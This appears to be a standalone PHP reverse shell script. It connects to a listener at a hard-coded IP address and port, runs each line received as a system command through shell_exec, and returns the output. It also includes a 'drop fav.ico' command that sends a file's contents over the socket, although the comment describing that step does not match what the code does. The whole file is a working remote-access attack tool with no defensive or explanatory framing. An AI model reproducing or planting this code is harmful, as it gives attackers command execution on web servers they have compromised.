<?php

// Set the IP address and port of your listener
$ip = "192.168.1.10";
$port = 443;

// Create a TCP socket
$socket = fsockopen($ip, $port);

// Check if the socket was created successfully
if ($socket === false) {
    echo "Error: Could not create socket";
    exit();
}

// Set the shell prompt
fputs($socket, "\n\n$ ");

// Start reading from the socket
while (!feof($socket)) {
    $line = fgets($socket, 1024);
    echo $line;

    // If the user enters a command, execute it
    if (trim($line) != "") {
        $command = trim($line);
        $output = shell_exec($command);
        fputs($socket, $output);
    }

    // If the user enters the command "drop fav.ico", drop the fav.ico file to the remote system
    if ($line == "drop fav.ico") {
        $file = "fav.ico";
        $contents = file_get_contents($file);
        fputs($socket, $contents);
    }
}

// Close the socket
fclose($socket);

?>
